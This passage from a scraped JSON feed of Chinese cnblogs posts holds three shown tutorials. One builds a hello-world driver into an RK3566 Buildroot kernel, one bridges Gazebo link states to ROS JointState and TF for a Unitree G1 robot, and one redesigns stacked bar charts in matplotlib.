class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 19:02</span>&nbsp;\n<a href=\"https://www.cnblogs.com/chingho\">chingho</a>&nbsp;\n阅读(<span id=\"post_view_count\">108</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "编写一个Buildroot 内核驱动",
      "link": "https://www.cnblogs.com/tianwuyvlianshui/p/19498842",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/tianwuyvlianshui/p/19498842\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 17:40\">\n    <span>编写一个Buildroot 内核驱动</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"编写一个buildroot-内核驱动\">编写一个Buildroot 内核驱动</h1>\n<blockquote>\n<p>PS:内核驱动只能在<strong>/kernel/drivers/</strong>目录下</p>\n</blockquote>\n<p><img alt=\"image-20260117082757215\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173751023-892940144.png\" /></p>\n<h2 id=\"makefile文件的编写\">Makefile文件的编写</h2>\n<blockquote>\n<p>主要注意Makefile文件的编写（路径，包含）</p>\n<p>在该路径下先新建一个用户内核驱动文件夹，用于存放用户编写的驱动</p>\n<p><strong>user_rk3566_-kernel-driver</strong></p>\n<p>进入该文件夹，新建一个02序号用户驱动文件夹，用于存放02驱动</p>\n<p><strong>02_kernel_helloworld</strong></p>\n<p>编写kernel/drivers/user_rk3566_-kernel-driver/02_kernel_helloworld路径下的Makefile（添加驱动源文件<strong>02_kernel_helloworld.c</strong>进编译）</p>\n<pre><code>vim Makefile\n</code></pre>\n<p>Makefile：</p>\n<pre><code>#obj-y :内核驱动\n#obj-m :模块驱动\nobj-y += 02_hello_world.o\n</code></pre>\n<p>返回到<strong>kernel/drivers/user_rk3566_-kernel-driver</strong>路径，添加Makefile（添加驱动源文件的文件夹<strong>02_kernel_helloworld/</strong>进编译）</p>\n<p>Makefile：</p>\n<pre><code>#添加驱动文件所在文件夹进编译，需要带“/”符号，表示目录（文件夹）\nobj-y += 02_kernel_helloworld/\n</code></pre>\n<p>返回到<strong>kernel/drivers</strong>路径，添加Makefile（添加驱动源文件的文件夹user_rk3566_-kernel-driver/进编译）</p>\n<p>Makefile：</p>\n<pre><code>obj-y +=/user_rk3566_-kernel-driver/\n</code></pre>\n<p>随便找个地方，把文件夹路径丢进去</p>\n</blockquote>\n<img alt=\"image-20260118171936747\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173754308-308553245.png\" />\n<blockquote>\n<p>OK,由于SDK路径的Makefile文件已经将kernel/drivers路径添加，我们就不需要自己手动添加</p>\n<p>以上就是所需要添加的Makefile文件。</p>\n<p>主要目的是告诉make工具在<strong>kernel/drivers/user_rk3566_-kernel-driver/02_kernel_helloworld</strong>路径下是我们的驱动源代码<strong>02_kernel_helloworld.c</strong>，需要添加进编译</p>\n</blockquote>\n<h2 id=\"驱动文件编写\">驱动文件编写</h2>\n<blockquote>\n<p>进入该02_kernel_helloworld，开始驱动编写</p>\n<pre><code>vim 02_hello_world.c \n</code></pre>\n<p>02_hello_world.c</p>\n<pre><code class=\"language-c\">#include &lt;linux/module.h&gt;     /* 模块相关宏和函数 */\n#include &lt;linux/kernel.h&gt;     /* printk日志函数 */\n\n/* 加载函数（驱动入口），当驱动被 insmod 加载时自动执行 */\nstatic int __init helloworld_init(void)\n{\n    printk(\"02_helloworld_init\\r\\n\"); // 内核日志打印\n    return 0; // 返回0代表加载成功\n}\n\n/* 卸载函数（驱动出口），当驱动被 rmmod 卸载时自动执行 */\nstatic void __exit helloworld_exit(void)\n{\n    printk(\"02_helloworld_exit\\r\\n\");\n}\n\n/* 下面这两行，告诉内核入口和出口分别是哪两个函数 */\nmodule_init(helloworld_init);\nmodule_exit(helloworld_exit);\n\n/* 这3个是模块信息声明 */\nMODULE_LICENSE(\"GPL v2\");               /* 模块许可证 */\n\n</code></pre>\n</blockquote>\n<h2 id=\"编译\">编译</h2>\n<p>我们需要返回到kernel内核文件夹的上一个路径</p>\n<p>在我这是SDK/，这里包含了编译脚本，须在这里运行编译命令</p>\n<pre><code>./build.sh kernel\n</code></pre>\n<p><img alt=\"image-20260118172404378\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173751745-1600325666.png\" /></p>\n<p>编译成功</p>\n<p><img alt=\"image-20260118172442489\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173752421-1683639729.png\" /></p>\n<p>返回源代码路径查看编译文件（可选）</p>\n<p><img alt=\"image-20260118163216910\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173752940-2085711302.png\" /></p>\n<p>可以看到，内核驱动编译后，不会像模块驱动那样生成<strong>.ko</strong>文件</p>\n<p>实际，驱动相关的内容已经编译进内核镜像中（root.img）</p>\n<p><img alt=\"image-20260118172723586\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173753283-1927509773.png\" /></p>\n<h2 id=\"运行\">运行</h2>\n<p>将该镜像烧录，等板子运行后查看日志</p>\n<pre><code>dmesg | grep -E hello\n</code></pre>\n<p><img alt=\"image-20260118173111518\" src=\"https://img2024.cnblogs.com/blog/3281938/202601/3281938-20260118173753691-118600053.png\" /></p>\n<p>可以看到驱动上电后自动运行，这就是和模块驱动的一个显著区别，不需要手动挂载</p>\n<p>修改完后，git提交一下代码更改（可选）</p>\n<pre><code>git add .\ngit commit -m\"修改说明\"\ngit pull\ngit push\n</code></pre>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 17:40</span>&nbsp;\n<a href=\"https://www.cnblogs.com/tianwuyvlianshui\">沁拒离</a>&nbsp;\n阅读(<span id=\"post_view_count\">44</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "ROS1 noetic 中将 Unitree G1 基于 Gazebo/RViz 关节联动【基于 Gazebo 状态反馈】",
      "link": "https://www.cnblogs.com/zylyehuo/p/19498596",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/zylyehuo/p/19498596\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 15:37\">\n    <span>ROS1 noetic 中将 Unitree G1 基于 Gazebo/RViz 关节联动【基于 Gazebo 状态反馈】</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<blockquote>\n<p>博客地址：<a href=\"https://www.cnblogs.com/zylyehuo/\" target=\"_blank\">https://www.cnblogs.com/zylyehuo/</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://github.com/unitreerobotics/unitree_ros/tree/master/robots/g1_description\" rel=\"noopener nofollow\" target=\"_blank\">Unitree G1 模型文件下载地址(挑选自己需要的部分，本教程基于 g1_29dof.urdf (以及 .xml 和 meshes 文件夹))</a></p>\n</blockquote>\n<blockquote>\n<p>有核心的 URDF 文件和 Meshes (STL 网格文件)</p>\n</blockquote>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3071480/202601/3071480-20260113204337327-270675226.png\" /></p>\n<blockquote>\n<p>为 Gazebo 中模型添加颜色参考：<a href=\"https://www.cnblogs.com/zylyehuo/p/19479129\" target=\"_blank\">ROS1 noetic 中将 Unitree G1 的 URDF 导入 Gazebo/RViz</a></p>\n</blockquote>\n<blockquote>\n<p>并非基于传统的 ros_control（通过插件控制关节），而是通过 Gazebo 状态反馈 -&gt; 计算位姿 -&gt; 映射到 TF 和 JointState 的方式实现的。</p>\n</blockquote>\n<ul>\n<li>该系统跳过了 ros_control 控制器。</li>\n<li>向 /joint_commands 发送 JointState 消息时，脚本会调用 Gazebo 的 /gazebo/set_model_configuration 服务。</li>\n<li>这个服务直接“强行”设置 Gazebo 中物理模型的关节位置，类似于瞬移，而不是施加力矩。在调试规划算法时非常高效。</li>\n</ul>\n<h1 id=\"效果预览\">效果预览</h1>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3071480/202601/3071480-20260118152755660-1755629437.png\" /></p>\n<h1 id=\"工作空间结构\">工作空间结构</h1>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/3071480/202601/3071480-20260118161444336-1800514403.png\" /></p>\n<h1 id=\"主要文件\">主要文件</h1>\n<h2 id=\"display_and_gazebolaunch\">display_and_gazebo.launch</h2>\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;launch&gt;\n  &lt;!-- 加载机器人URDF模型参数 --&gt;\n  &lt;param name=\"robot_description\" textfile=\"$(find g1_description)/urdf/g1_29dof.urdf\" /&gt;\n\n  &lt;!-- TF静态变换 --&gt;\n  &lt;node pkg=\"tf\" type=\"static_transform_publisher\" name=\"world_to_map\" args=\"0 0 0  0 0 0 1  world map 10\"/&gt;\n  &lt;!-- NOTE: removed static base_link-&gt;pelvis to avoid TF duplication; link_states_bridge publishes dynamic map-&gt;base_link --&gt;\n  &lt;node pkg=\"tf\" type=\"static_transform_publisher\" name=\"imu_in_torso2body_imu\" args=\"0.0  0.0  0.0   0.0 0.0 0.0 1  imu_in_torso body_imu 100\" /&gt;\n  &lt;!-- NOTE: keep base_link-&gt;pelvis as a static zero transform so pelvis and base_link coincide --&gt;\n  &lt;node pkg=\"tf\" type=\"static_transform_publisher\" name=\"base_link2pelvis\" args=\"0 0 0  0 0 0 1  base_link pelvis 100\" /&gt;\n\n  &lt;!-- 机器人状态发布器 --&gt;\n  &lt;node name=\"robot_state_publisher\" pkg=\"robot_state_publisher\" type=\"robot_state_publisher\" /&gt;\n\n  &lt;!-- LinkStates到JointState的桥接，同时发布动态TF和处理关节命令 --&gt;\n  &lt;node name=\"link_states_bridge\" pkg=\"g1_description\" type=\"link_states_bridge.py\" output=\"screen\" /&gt;\n\n  &lt;!-- RViz --&gt;\n  &lt;node name=\"rviz\" pkg=\"rviz\" type=\"rviz\" respawn=\"false\" output=\"screen\" /&gt;\n\n  &lt;!-- ============ Gazebo配置 ============ --&gt;\n  &lt;!-- 启动Gazebo --&gt;\n  &lt;include file=\"$(find gazebo_ros)/launch/empty_world.launch\"&gt;\n    &lt;arg name=\"paused\" value=\"false\"/&gt;\n    &lt;arg name=\"use_sim_time\" value=\"true\"/&gt;\n    &lt;arg name=\"gui\" value=\"true\"/&gt;\n    &lt;arg name=\"headless\" value=\"false\"/&gt;\n  &lt;/include&gt;\n\n  &lt;!-- 将机器人模型生成到Gazebo中 --&gt;\n  &lt;node name=\"spawn_urdf\" pkg=\"gazebo_ros\" type=\"spawn_model\" \n    args=\"-param robot_description -urdf -z 0.79 -model g1_robot\" \n    output=\"screen\" /&gt;\n\n  &lt;!-- NOTE: controller parameters loading removed to avoid conflicts; using bridge(set_model_configuration) instead --&gt;\n\n&lt;/launch&gt;\n\n</code></pre>\n<h2 id=\"link_states_bridgepy\">link_states_bridge.py</h2>\n<pre><code class=\"language-python\">#!/usr/bin/env python3\n\nimport rospy\nimport math\nfrom gazebo_msgs.msg import LinkStates\nfrom sensor_msgs.msg import JointState\nfrom std_msgs.msg import Float64\nimport numpy as np\nfrom scipy.spatial.transform import Rotation\nimport threading\nimport tf\nfrom geometry_msgs.msg import TransformStamped\nfrom gazebo_msgs.srv import SetModelConfiguration\n\nclass LinkStatesToJointState:\n    def __init__(self):\n        rospy.init_node('link_states_to_joint_state')\n        \n        # 订阅Gazebo的链接状态\n        self.link_states_sub = rospy.Subscriber('/gazebo/link_states', LinkStates, self.link_states_callback, queue_size=1)\n        \n        # 订阅关节命令话题（用于控制Gazebo中的关节）\n        self.joint_cmd_sub = rospy.Subscriber('/joint_commands', JointState, self.joint_cmd_callback, queue_size=1)\n        \n        # 发布joint_states\n        self.joint_states_pub = rospy.Publisher('/joint_states', JointState, queue_size=1)\n        \n        # 发布TF变换\n        self.tf_broadcaster = tf.TransformBroadcaster()\n        \n        # 所有关节及其parent/child链接映射\n        self.joints_info = {\n            'left_hip_pitch_joint': ('pelvis', 'left_hip_pitch_link', [0, 1, 0]),\n            'left_hip_roll_joint': ('left_hip_pitch_link', 'left_hip_roll_link', [1, 0, 0]),\n            'left_hip_yaw_joint': ('left_hip_roll_link', 'left_hip_yaw_link', [0, 0, 1]),\n            'left_knee_joint': ('left_hip_yaw_link', 'left_knee_link', [0, 1, 0]),\n            'left_ankle_pitch_joint': ('left_knee_link', 'left_ankle_pitch_link', [0, 1, 0]),\n            'left_ankle_roll_joint': ('left_ankle_pitch_link', 'left_ankle_roll_link', [1, 0, 0]),\n            'right_hip_pitch_joint': ('pelvis', 'right_hip_pitch_link', [0, 1, 0]),\n            'right_hip_roll_joint': ('right_hip_pitch_link', 'right_hip_roll_link', [1, 0, 0]),\n            'right_hip_yaw_joint': ('right_hip_roll_link', 'right_hip_yaw_link', [0, 0, 1]),\n            'right_knee_joint': ('right_hip_yaw_link', 'right_knee_link', [0, 1, 0]),\n            'right_ankle_pitch_joint': ('right_knee_link', 'right_ankle_pitch_link', [0, 1, 0]),\n            'right_ankle_roll_joint': ('right_ankle_pitch_link', 'right_ankle_roll_link', [1, 0, 0]),\n            'waist_yaw_joint': ('pelvis', 'waist_yaw_link', [0, 0, 1]),\n            'waist_roll_joint': ('waist_yaw_link', 'waist_roll_link', [1, 0, 0]),\n            'waist_pitch_joint': ('waist_roll_link', 'torso_link', [0, 1, 0]),\n            'left_shoulder_pitch_joint': ('torso_link', 'left_shoulder_pitch_link', [0, 1, 0]),\n            'left_shoulder_roll_joint': ('left_shoulder_pitch_link', 'left_shoulder_roll_link', [1, 0, 0]),\n            'left_shoulder_yaw_joint': ('left_shoulder_roll_link', 'left_shoulder_yaw_link', [0, 0, 1]),\n            'left_elbow_joint': ('left_shoulder_yaw_link', 'left_elbow_link', [0, 1, 0]),\n            'left_wrist_roll_joint': ('left_elbow_link', 'left_wrist_roll_link', [1, 0, 0]),\n            'left_wrist_pitch_joint': ('left_wrist_roll_link', 'left_wrist_pitch_link', [0, 1, 0]),\n            'left_wrist_yaw_joint': ('left_wrist_pitch_link', 'left_wrist_yaw_link', [0, 0, 1]),\n            'right_shoulder_pitch_joint': ('torso_link', 'right_shoulder_pitch_link', [0, 1, 0]),\n            'right_shoulder_roll_joint': ('right_shoulder_pitch_link', 'right_shoulder_roll_link', [1, 0, 0]),\n            'right_shoulder_yaw_joint': ('right_shoulder_roll_link', 'right_shoulder_yaw_link', [0, 0, 1]),\n            'right_elbow_joint': ('right_shoulder_yaw_link', 'right_elbow_link', [0, 1, 0]),\n            'right_wrist_roll_joint': ('right_elbow_link', 'right_wrist_roll_link', [1, 0, 0]),\n            'right_wrist_pitch_joint': ('right_wrist_roll_link', 'right_wrist_pitch_link', [0, 1, 0]),\n            'right_wrist_yaw_joint': ('right_wrist_pitch_link', 'right_wrist_yaw_link', [0, 0, 1]),\n        }\n        \n        # Gazebo set_model_configuration 服务代理（用于直接设置关节位置，替代ros_control）\n        rospy.wait_for_service('/gazebo/set_model_configuration')\n        self.set_model_config = rospy.ServiceProxy('/gazebo/set_model_configuration', SetModelConfiguration)\n        \n        self.last_msg = None\n        self.lock = threading.Lock()\n        self.initial_pelvis_z = None  # 初始pelvis高度\n\n        # TF 发布节流参数\n        self.last_tf_time = rospy.Time(0)\n        self.tf_min_interval = rospy.Duration(0.05)  # 最小间隔 50ms\n        self.last_pelvis_pose = None\n        self.tf_pos_thresh = 0.005   # 5mm\n        self.tf_rot_thresh = 0.01    # ~0.57deg\n        \n        rospy.loginfo(\"Link States to Joint State Bridge initialized\")\n        rospy.loginfo(\"Now using /gazebo/set_model_configuration to apply joint commands\")\n        rospy.loginfo(\"Publish JointState to /joint_commands to control joints\")\n    \n    def link_states_callback(self, msg):\n        with self.lock:\n            self.last_msg = msg\n            self.publish_joint_states(msg)\n            self.publish_dynamic_tf(msg)\n    \n    def joint_cmd_callback(self, msg):\n        \"\"\"订阅关节命令话题，使用Gazebo服务设置关节位置（不依赖URDF transmission）\"\"\"\n        try:\n            if not msg.name or not msg.position:\n                rospy.logwarn(\"Received empty joint command\")\n                return\n            # 调用服务设置关节位置\n            model_name = 'g1_robot'\n            urdf_param_name = 'robot_description'\n            joint_names = list(msg.name)\n            joint_positions = list(msg.position)\n            rospy.loginfo(f\"Setting joints via service: {joint_names} -&gt; {joint_positions}\")\n            self.set_model_config(model_name, urdf_param_name, joint_names, joint_positions)\n        except Exception as e:\n            rospy.logerr(f\"Failed to call set_model_configuration: {e}\")\n    \n    def get_link_index(self, link_name, msg):\n        \"\"\"获取链接在LinkStates中的索引\"\"\"\n        full_name = f'g1_robot::{link_name}'\n        try:\n            return msg.name.index(full_name)\n        except ValueError:\n            return -1\n    \n    def get_relative_rotation(self, parent_pose, child_pose):\n        \"\"\"计算从parent到child的相对旋转（四元数）\"\"\"\n        p_quat = [parent_pose.orientation.x, parent_pose.orientation.y, \n                  parent_pose.orientation.z, parent_pose.orientation.w]\n        c_quat = [child_pose.orientation.x, child_pose.orientation.y, \n                  child_pose.orientation.z, child_pose.orientation.w]\n        \n        p_rot = Rotation.from_quat(p_quat)\n        c_rot = Rotation.from_quat(c_quat)\n        \n        rel_rot = p_rot.inv() * c_rot\n        \n        return rel_rot\n    \n    def rotation_to_angle_around_axis(self, rotation, axis):\n        angle = rotation.magnitude()\n        \n        if abs(angle) &lt; 1e-6:\n            return 0.0\n        \n        rotvec = rotation.as_rotvec()\n        rot_axis = rotvec / angle if angle &gt; 1e-6 else [0, 0, 1]\n        \n        axis_norm = np.array(axis) / np.linalg.norm(axis)\n        \n        if np.dot(rot_axis, axis_norm) &gt; 0.9:\n            return angle\n        elif np.dot(rot_axis, axis_norm) &lt; -0.9:\n            return -angle\n        else:\n            euler = rotation.as_euler('xyz')\n            if axis == [1, 0, 0]:\n                return euler[0]\n            elif axis == [0, 1, 0]:\n                return euler[1]\n            elif axis == [0, 0, 1]:\n                return euler[2]\n            else:\n                return 0.0\n    \n    def publish_joint_states(self, msg):\n        joint_state = JointState()\n        joint_state.header.stamp = rospy.Time.now()\n        joint_state.name = list(self.joints_info.keys())\n        joint_state.position = []\n        joint_state.velocity = [0.0] * len(joint_state.name)\n        joint_state.effort = [0.0] * len(joint_state.name)\n        \n        for joint_name, (parent_name, child_name, axis) in self.joints_info.items():\n            parent_idx = self.get_link_index(parent_name, msg)\n            child_idx = self.get_link_index(child_name, msg)\n            \n            if parent_idx &lt; 0 or child_idx &lt; 0:\n                joint_state.position.append(0.0)\n                continue\n            \n            rel_rot = self.get_relative_rotation(msg.pose[parent_idx], msg.pose[child_idx])\n            angle = self.rotation_to_angle_around_axis(rel_rot, axis)\n            \n            joint_state.position.append(angle)\n        \n        self.joint_states_pub.publish(joint_state)\n    \n    def publish_dynamic_tf(self, msg):\n        pelvis_idx = self.get_link_index('pelvis', msg)\n\n        if pelvis_idx &lt; 0:\n            return\n\n        pelvis_pose = msg.pose[pelvis_idx]\n\n        # 节流逻辑\n        now = rospy.Time.now()\n        if self.last_pelvis_pose is not None:\n            pos_diff = np.linalg.norm([\n                pelvis_pose.position.x - self.last_pelvis_pose.position.x,\n                pelvis_pose.position.y - self.last_pelvis_pose.position.y,\n                pelvis_pose.position.z - self.last_pelvis_pose.position.z\n            ])\n            rot_diff = Rotation.from_quat([\n                pelvis_pose.orientation.x, pelvis_pose.orientation.y,\n                pelvis_pose.orientation.z, pelvis_pose.orientation.w\n            ]).inv() * Rotation.from_quat([\n                self.last_pelvis_pose.orientation.x, self.last_pelvis_pose.orientation.y,\n                self.last_pelvis_pose.orientation.z, self.last_pelvis_pose.orientation.w\n            ])\n            rot_diff_angle = rot_diff.magnitude()\n\n            if pos_diff &lt; self.tf_pos_thresh and rot_diff_angle &lt; self.tf_rot_thresh and (now - self.last_tf_time) &lt; self.tf_min_interval:\n                return\n\n        self.last_tf_time = now\n        self.last_pelvis_pose = pelvis_pose\n\n        translation = (pelvis_pose.position.x, pelvis_pose.position.y, pelvis_pose.position.z)\n        rotation_q = (pelvis_pose.orientation.x, pelvis_pose.orientation.y, pelvis_pose.orientation.z, pelvis_pose.orientation.w)\n\n        # 只发布 map -&gt; base_link，让 base_link-&gt;pelvis 由静态发布器（launch）处理\n        self.tf_broadcaster.sendTransform(\n            translation=translation,\n            rotation=rotation_q,\n            time=rospy.Time.now(),\n            child='base_link',\n            parent='map'\n        )\n\nif __name__ == '__main__':\n    try:\n        node = LinkStatesToJointState()\n        rospy.spin()\n    except rospy.ROSInterruptException:\n        pass\n\n</code></pre>\n<h1 id=\"运行步骤\">运行步骤</h1>\n<pre><code>cd ~/g1_test_ws\n</code></pre>\n<pre><code>catkin_make\n</code></pre>\n<pre><code>source ./devel/setup.bash\n</code></pre>\n<pre><code>roslaunch g1_description display_and_gazebo.launch\n</code></pre>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 15:37</span>&nbsp;\n<a href=\"https://www.cnblogs.com/zylyehuo\">zylyehuo</a>&nbsp;\n阅读(<span id=\"post_view_count\">29</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "打破堆积困局：优化堆积条形图的对比效果",
      "link": "https://www.cnblogs.com/wang_yb/p/19498573",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/wang_yb/p/19498573\" id=\"cb_post_title_url\" title=\"发布于 2026-01-18 15:25\">\n    <span>打破堆积困局：优化堆积条形图的对比效果</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>在数据可视化中，<strong>堆积条形图</strong> 擅长展示 <strong>“整体与构成”</strong> 的关系，但当每个柱子内的分段超过4个时，读者很难同时追踪各段的长度、位置与颜色映射， <strong>误读概率显著上升</strong>。</p>\n<p>更糟的是，若不同类别的总量差异很大，堆积结构会放大视觉错觉，导致“看起来差不多”的结论失真。</p>\n<p>今天，本文将尝试探索一下改进堆积条形图的呈现方式，让复杂数据对比变得一目了然。</p>\n<p>如果大家有更好的方式，也欢迎指教，交流。<strong>完整的代码</strong>会在文末提供共享的地址。</p>\n<h1 id=\"1-堆积条形图的困境\">1. 堆积条形图的困境</h1>\n<p><strong>堆积条形图</strong>就像一道精心摆盘的多层蛋糕，当层数不多时，我们能轻松分辨每层的高度差异。</p>\n<p>但当蛋糕层数超过4层，要比较某一特定口味在多个蛋糕中的含量就变得异常困难。</p>\n<p>下面我们用<code>Python</code>模拟一个常见的堆积条形图场景：调查某产品5个功能模块的用户满意度（5个维度），共收集了4个季度的数据。</p>\n<pre><code class=\"language-python\"># 模拟数据：4个季度，5个满意度维度（强烈反对、反对、中立、同意、坚决同意）\nquarters = [\"第一季度\", \"第二季度\", \"第三季度\", \"第四季度\"]\ncategories = [\"强烈反对\", \"反对\", \"中立\", \"同意\", \"坚决同意\"]\ncolors = [\"#FF6B6B\", \"#FF9F6B\", \"#D6CBCB\", \"#6BCF7F\", \"#4D96FF\"]\n\n# 每个季度的满意度分布（百分比）\ndata = np.array(\n    [\n        [5, 10, 25, 40, 20],  # 第一季度\n        [3, 8, 20, 45, 24],  # 第二季度\n        [4, 12, 18, 43, 23],  # 第三季度\n        [2, 6, 15, 50, 27],  # 第四季度\n    ]\n)\n\n# 传统横向堆积条形图\nfig, ax = plt.subplots(1, 2, figsize=(14, 4), gridspec_kw={\"width_ratios\": [1, 1]})\n\n# 左图：传统横向堆积条形图\n# ... 省略 ...\n\n# 右图：横向堆叠条形图的改进版，添加分隔线\n# ... 省略 ...\n\nplt.tight_layout()\nplt.show()\n</code></pre>\n\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/83005/202601/83005-20260118152231940-1462391798.png\" /></p>\n<p>这个横向堆积条形图展示了每个季度用户满意度的完整分布，随便右边的图稍微做了一些改进，</p>\n<p>但如果我们想回答以下问题就会遇到困难：</p>\n<ul>\n<li><strong>\"坚决同意\"</strong> 的比例在哪个季度最高？</li>\n<li><strong>\"反对\"</strong> 和 <strong>\"强烈反对\"</strong> 的比例如何随时间变化？</li>\n</ul>\n<h1 id=\"2-拆解重构--多个子图\">2. 拆解重构--多个子图</h1>\n<p>与其把所有食材炖在一锅里，不如将它们分盘摆放。</p>\n<p>我们将<strong>堆积条形图</strong>拆解为5个小图，每个小图只关注一个满意度维度的季度变化。</p>\n<pre><code class=\"language-python\">import matplotlib.gridspec as gridspec\n\nfig = plt.figure(figsize=(12, 6))\ngs = gridspec.GridSpec(2, 5, figure=fig, hspace=0.3, wspace=0.4)\n# 拆解堆积条形图：为每个类别创建单独的横向子图\naxes = []\nfor i in range(5):\n    axes.append(fig.add_subplot(gs[0, i]))\n\n# 为每个满意度维度创建一个横向条形图\nfor i, (category, color, ax) in enumerate(zip(categories, colors, axes)):\n    # ... 省略 ...\n\nax = fig.add_subplot(gs[1, :]) # 第1行，所有列 (等同于 gs[1, 0:5])\n# ... 省略 ...\n\nplt.show()\n</code></pre>\n\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/83005/202601/83005-20260118152232008-1859050466.png\" /></p>\n<p>拆解后的图表确实提升了单一维度的对比效果，但仍有一个明显问题：我们的视线需要在多个图表间来回跳跃，无法形成统一的视觉印象。</p>\n<p>这就像阅读一本分散在多个页面的表格，需要不断翻页对照。</p>\n<h1 id=\"3-双向对比--蝴蝶图\">3. 双向对比--蝴蝶图</h1>\n<p><strong>蝴蝶图</strong>（也称为人口金字塔图或双向条形图）是数据可视化的\"瑞士军刀\"，特别适合展示对立或双向比较的数据。</p>\n<p>它的设计哲学是：让对比在中心轴两侧自然展开，就像蝴蝶展开双翅。</p>\n<pre><code class=\"language-python\"># 4. 创建画布\nfig, ax = plt.subplots(2, 1,figsize=(10, 6))\ny_pos = np.arange(len(quarters))\n# 拆分数据列\nstrongly_disagree = data[:, 0]\ndisagree          = data[:, 1]\nneutral           = data[:, 2]\nagree             = data[:, 3]\nstrongly_agree    = data[:, 4]\n\n# ==========================================\n# 核心逻辑修改：以中立(Neutral)的中心为0点\n# ==========================================\n# 1. 绘制中立 (灰色)：跨越 0 轴\n# left 从 -width/2 开始，这样 0 就在正中间\n\n# 2. 绘制左侧 (负面情绪)：向左堆叠\n# 反对 (Green)：起始位置在 -neutral/2 的左边\n\n# 强烈反对 (Purple)：起始位置在 反对 的左边\n\n# 3. 绘制右侧 (正面情绪)：向右堆叠\n# 同意 (Orange)：起始位置在 neutral/2\n\n# 强烈同意 (Red)：起始位置在 同意 的右边\n\n# 5. 美化图表\n# 添加中间的基准线 (穿过中立条形)\n# ... 省略 ...\nplt.show()\n</code></pre>\n\n<p><img alt=\"\" src=\"https://img2024.cnblogs.com/blog/83005/202601/83005-20260118152232037-237677572.png\" /></p>\n<p><strong>蝴蝶图</strong>和一般的堆积条形图放在一起，可以明显看出两者在数据展示逻辑和视觉重心上有显著区别。</p>\n<p><strong>蝴蝶图</strong>侧重于展示 <strong>“对立态度的对比”</strong>，适合看正反两面的力量悬殊以及整体的情绪倾向，而且也便于比较同侧的数据。</p>\n<h1 id=\"4-总结\">4. 总结</h1>\n<p>总之，<strong>堆积条形图</strong>像一锅大杂烩，当食材（数据维度）过多时，我们很难品尝（分析）到每种食材的原味。</p>\n<p>通过拆解和重构，我们获得了更清晰的视角。而蝴蝶图则像一位优雅的舞者，将对比数据以对称的方式展开，既保留了整体视野，又强化了局部对比。</p>\n<p>优秀的数据可视化不在于展示所有信息，而在于以最少的认知成本传达最多的洞察。</p>\n<p>下次当我们面对多维数据对比的挑战时，不妨试试横向蝴蝶图这把\"瑞士军刀\"，它可能会给你带来意想不到的清晰与美感。</p>\n<p>绘制文中图像的完整代码共享在：<a href=\"https://url11.ctfile.com/f/45455611-8606783265-a93d12?p=6872\" rel=\"noopener nofollow\" target=\"_blank\">优化堆积条形图.ipynb</a> (访问密码: 6872)</p>\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-18 15:25</span>&nbsp;\n<a href=\"https://www.cnblogs.com/wang_yb\">wang_yb</a>&nbsp;\n阅读(<span id=\"post_view_count\">34</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "2026 年 PHP 函数式编程 优势与实际应用",
      "link": "https://www.cnblogs.com/catchadmin/p/19497758",
      "published": "",
